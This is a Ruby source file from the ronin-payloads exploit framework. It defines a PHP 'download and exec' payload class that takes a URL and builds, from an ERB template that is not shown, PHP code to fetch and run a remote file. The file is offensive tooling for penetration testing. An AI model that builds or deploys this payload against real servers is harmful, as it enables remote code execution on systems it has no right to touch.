# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require_relative '../../php_payload'
require_relative '../../mixins/erb'

module Ronin
  module Payloads
    module PHP
      #
      # A basic PHP download and exec payload.
      #
      # @since 0.2.0
      #
      class DownloadExec < PHPPayload

        include Mixins::ERB

        register 'php/download_exec'

        param :url, URI, required: true,
                         desc:     'The URL to download and execute'

        TEMPLATE = File.join(__dir__,'download_exec.php.erb')

        #
        # Builds the PHP command exec payload.
        #
        def build
          @payload = erb(TEMPLATE)
        end

      end
    end
  end
end
